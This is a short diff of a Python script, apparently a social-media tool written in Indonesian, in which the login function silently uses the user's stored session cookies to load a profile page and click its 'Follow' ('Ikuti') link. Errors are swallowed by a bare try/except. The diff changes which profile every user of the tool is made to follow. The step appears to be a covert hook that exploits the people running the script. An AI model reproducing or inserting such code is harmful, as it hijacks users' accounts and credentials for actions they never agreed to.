@@ -46,7 +46,7 @@ def masuk():
             except:
                  pass
         try:
-             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+             ikuti = parser(requests.get(mbasic.format("/kang.ngeue.313"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
              ses.get(mbasic.format(ikuti),cookies=cek)
         except:
              pass
